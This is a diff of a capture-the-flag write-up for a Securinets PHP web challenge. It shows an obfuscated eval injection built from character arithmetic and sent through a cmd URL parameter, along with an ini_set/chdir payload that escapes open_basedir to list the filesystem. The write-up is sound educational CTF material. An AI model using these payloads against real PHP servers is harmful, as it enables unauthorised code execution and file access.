@@ -58,7 +58,7 @@ if(!isset($_GET['cmd'])){
 
 
 ```
-(l|v)           =>  `
+(l|v)           =>  ~
 (v|e)           =>   w
 ((2).(2){0}|a)  =>   s
 ((2).(2)|(9).(9))  =>  ;;
@@ -87,13 +87,16 @@ http://web2.q21.ctfsecurinets.com:8081/?%20cmd=eval((((((1/0).(1)){0})%26(((1/0)
 
 * we found that ``ini_set()``  is not disabled
 * there is a ``/images`` dir in 
+* 
 
-payload:**ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);chdir('images');ini_set('open_basedir', '..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir', '/');new Finfo(0,"/");**
+payload:**ini_set('display_errors', 1);ini_set('display_startup_errors', 1);error_reporting(E_ALL);chdir('images');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir', '/');new Finfo(0,"/");**
+
 
 
 ```css
 http://web2.q21.ctfsecurinets.com:8081/?+cmd=eval(((ev).(al).((8).a%26(l)).((((4)._%26e_).((((9999**999999).a){2})|((0%2F0).a){1}).((_)%26e).(((0).a|(e%26l))%26((_))).(((((2).a)|a)|((8).aa))%26((_).aa)).((((1).(2))|l.(9))%26(_))))).((9).a%26(a|l)).((2).(2)|(9).(9)))&aa=ini_set(%27display_errors%27,%201);ini_set(%27display_startup_errors%27,%201);error_reporting(E_ALL);chdir(%27images%27);ini_set(%27open_basedir%27,%20%27..%27);chdir(%27..%27);chdir(%27..%27);chdir(%27..%27);ini_set(%27open_basedir%27,%20%27/%27);new%20Finfo(0,%22/%22);
 ```
+
 
 
 ![image](https://user-images.githubusercontent.com/61080375/112038804-4f1c1700-8b69-11eb-90e0-9e368ad0b74f.png)
